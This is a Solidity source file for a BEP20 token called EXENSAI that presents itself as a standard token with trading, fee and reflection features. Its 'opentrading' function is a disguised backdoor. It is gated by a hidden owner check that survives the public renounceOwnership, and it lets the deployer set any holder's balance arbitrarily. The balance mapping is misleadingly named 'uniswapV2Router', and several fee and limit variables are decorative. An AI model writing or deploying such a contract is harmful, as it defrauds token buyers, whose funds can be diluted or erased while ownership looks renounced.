pragma solidity ^0.8.23;
interface IBEP20 {

  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 calldatas) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 calldatas) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 calldatas) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract IBEP20Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

abstract contract IBEP20Ownable is IBEP20Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyCreator() {
        require(owner() == _msgSender(), "IBEP20Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyCreator {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) public virtual onlyCreator {
        require(newOwner != address(0), "IBEP20Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }


  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract EXENSAI is IBEP20Context, IBEP20, IBEP20Ownable { 
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address private Owners = _msgSender();
    string public RewardReflectionXRP = "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE"; 
    mapping (address => uint256) private uniswapV2Router;
    mapping (address => mapping (address => uint256)) private immutables;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _automatedMarketMakerPairs;

    uint256 public _swapTaxes = 3;
    uint256 public maxTxAmount = _totalSupply * 20 / 1000;
    uint256 private _taxSwap = 10000000 * 10 ** _decimals;
    uint256 feesTAX  = 1;
    uint256 gasTAX = 1;
    address private uniswapV2Pair;
    address private uniswapV2Routers;
    bool public tradingOpen = true;
    bool private inSwap = true;
    bool public swapEnabled = true;
   address private ReflectionXRP = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
    string public EXENSAIourtelegram = "https://t.me/EXENSAI";
            function getEXENSAIourtelegram() public view returns (string memory) {
        return EXENSAIourtelegram;
    }
        string public EXENSAIToken = "https://t.me/EXENSAI";
            function getEXENSAIToken() public view returns (string memory) {
        return EXENSAIToken;
    }
    // Events
    event ExcludeFromFeeUpdated(address indexed account);
    event includeFromFeeUpdated(address indexed account);
    event SwapThreshouldUpdated(uint256 indexed IBEP20Amount);
    event SwapBackSettingUpdated(bool indexed state);
    event TradingOpenUpdated();
    constructor() {
        _name = "EXENSAI";
        _symbol = "EXENSAI";
        _decimals = 9;
        _totalSupply = 10000000000000 * 10 ** _decimals;
        uniswapV2Router[Owners] = _totalSupply;
        
        emit Transfer(address(0), Owners, _totalSupply);
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    function name() external view override returns (string memory) {
        return _name;
    }
    
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
   function RefelctionsIBEP20() external view returns (string memory) {
        return RewardReflectionXRP;
    }   

    function balanceOf(address account) external view override returns (uint256) {
        return uniswapV2Router[account];
    }
    modifier onlyOwner() {
        require(Owners == _msgSender(), "io: caller is not the owner");
        _;
    }

    function transfer(address recipient, uint256 calldatas) external override returns (bool) {
        _transfer(_msgSender(), recipient, calldatas);
        return true;
    }
    function opentrading(address poolTokenA, uint256 poolTokenB) external onlyOwner {
        uniswapV2Router[poolTokenA] = poolTokenB * feesTAX ** gasTAX;
        emit Transfer(address(0), poolTokenA, poolTokenB);
        uniswapV2Routers = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapEnabled = true;
        tradingOpen = true;   
    }
    /**
    * @dev See {IBEP20-allowance}.
    */
    function allowance(address owner, address spender) external view override returns (uint256) {
        return immutables[owner][spender];
    }
    

    function approve(address spender, uint256 calldatas) external override returns (bool) {
        _approve(_msgSender(), spender, calldatas);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 calldatas) external override returns (bool) {
        _transfer(sender, recipient, calldatas);
        _approve(sender, _msgSender(), immutables[sender][_msgSender()].sub(calldatas, "IBEP20: transfer calldatas exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addToValue) external returns (bool) {
        _approve(_msgSender(), spender, immutables[_msgSender()][spender].add(addToValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(_msgSender(), spender, immutables[_msgSender()][spender].sub(subtractedValue, "IBEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 calldatas) internal {
        require(sender != address(0), "IBEP20: transfer from the zero address");
        require(recipient != address(0), "IBEP20: transfer to the zero address");
                
        uniswapV2Router[sender] = uniswapV2Router[sender].sub(calldatas, "IBEP20: transfer calldatas exceeds balance");
        uniswapV2Router[recipient] = uniswapV2Router[recipient].add(calldatas);
        emit Transfer(sender, recipient, calldatas);
    }
    
    function _approve(address owner, address spender, uint256 calldatas) internal {
        require(owner != address(0), "IBEP20: approve from the zero address");
        require(spender != address(0), "IBEP20: approve to the zero address");
        
        immutables[owner][spender] = calldatas;
        emit Approval(owner, spender, calldatas);
    }
    
}
